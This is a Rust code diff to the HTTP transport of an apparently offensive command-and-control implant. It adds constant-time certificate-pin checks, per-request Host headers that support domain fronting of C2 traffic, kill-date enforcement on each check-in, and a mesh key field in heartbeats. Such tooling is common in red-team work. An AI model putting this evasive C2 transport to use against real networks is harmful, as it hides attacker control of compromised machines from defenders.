@@ -34,6 +34,7 @@ use async_trait::async_trait;
 use base64::Engine;
 use common::{CryptoSession, Message, Transport};
 use sha2::{Digest, Sha256};
+use subtle::ConstantTimeEq;
 use std::sync::atomic::{AtomicUsize, Ordering};
 use std::sync::Arc;
 use tokio::time::Duration;
@@ -293,12 +294,13 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
         let hex_fp = hex::encode(digest);
 
         if let Some(ref expected) = self.expected_fingerprint {
-            // Certificate pinning mode: compare fingerprints.
-            if hex_fp != expected.to_lowercase() {
+            // Certificate pinning mode: compare fingerprints using
+            // constant-time equality to prevent timing side-channel attacks
+            // that could brute-force the expected fingerprint byte-by-byte.
+            let expected_lower = expected.to_lowercase();
+            if !hex_fp.as_bytes().ct_eq(expected_lower.as_bytes()).into() {
                 log::error!(
-                    "cert pinning: fingerprint mismatch (got {}, expected {})",
-                    hex_fp,
-                    expected
+                    "cert pinning: fingerprint mismatch — rejecting connection"
                 );
                 return Err(rustls_0_21::Error::InvalidCertificate(
                     rustls_0_21::CertificateError::UnknownIssuer,
@@ -611,13 +613,12 @@ impl HttpTransport {
         }
 
         // Build default headers from the legacy config.
+        // NOTE: Host header is NOT baked into default headers here.
+        // It is applied per-request to avoid duplicate Host headers when
+        // domain fronting is active (fronted requests set Host to the
+        // actual C2 domain via build_fronted_request_with_client, while
+        // non-fronted requests set it in build_request_for_endpoint).
         let mut headers = reqwest::header::HeaderMap::new();
-        if !host_header.is_empty() {
-            headers.insert(
-                reqwest::header::HOST,
-                reqwest::header::HeaderValue::from_str(&host_header)?,
-            );
-        }
 
         // Build the reqwest client with TLS configuration from the profile.
         let cert_fingerprint = if profile.has_cert_pin() {
@@ -800,6 +801,8 @@ impl HttpTransport {
             .unwrap_or(&self.client);
 
         let req = if let Some(front) = effective_front {
+            // Domain fronting: TLS SNI uses front domain, Host header is set
+            // to the actual C2/redirector domain by build_fronted_request_with_client.
             Self::build_fronted_request_with_client(client, method, &full_url, front)
         } else {
             let url = if full_url.starts_with("http://") || full_url.starts_with("https://") {
@@ -807,7 +810,15 @@ impl HttpTransport {
             } else {
                 format!("https://{}", full_url)
             };
-            client.request(method, &url)
+            let mut req = client.request(method, &url);
+            // Apply Host header per-request for non-fronted requests when
+            // the malleable profile specifies one. This avoids the duplicate
+            // Host header that would occur if we baked it into the default
+            // client headers.
+            if !self.host_header.is_empty() {
+                req = req.header("Host", &self.host_header);
+            }
+            req
         };
 
         // Apply redirector-specific headers if active endpoint is a redirector.
@@ -1169,6 +1180,11 @@ impl Transport for HttpTransport {
     async fn send(&mut self, msg: Message) -> Result<()> {
         log::debug!("Malleable HTTP C2 Send (result delivery)");
 
+        // Enforce kill date on every send cycle.
+        if !self.kill_date.is_empty() {
+            check_kill_date(&self.kill_date)?;
+        }
+
         let endpoint = self.resolve_endpoint()?;
 
         // Use http_post for task output.
@@ -1245,6 +1261,11 @@ impl Transport for HttpTransport {
     async fn recv(&mut self) -> Result<Message> {
         log::debug!("Malleable HTTP C2 Recv (task fetch)");
 
+        // Enforce kill date on every recv cycle.
+        if !self.kill_date.is_empty() {
+            check_kill_date(&self.kill_date)?;
+        }
+
         let endpoint = self.resolve_endpoint()?;
 
         // Use http_get for checkins/tasking.
@@ -1272,6 +1293,7 @@ impl Transport for HttpTransport {
                 .as_secs(),
             agent_id: self.agent_id.clone(),
             status: "idle".to_string(),
+            mesh_public_key: None, // TODO: wire mesh keypair into HttpTransport
         };
         let serialized = bincode::serialize(&heartbeat)?;
         let ciphertext = self.session.encrypt(&serialized);
@@ -1341,6 +1363,7 @@ impl Transport for HttpTransport {
                     .as_secs(),
                 agent_id: self.agent_id.clone(),
                 status: "idle".to_string(),
+                mesh_public_key: None, // TODO: wire mesh keypair into HttpTransport
             });
         }
 
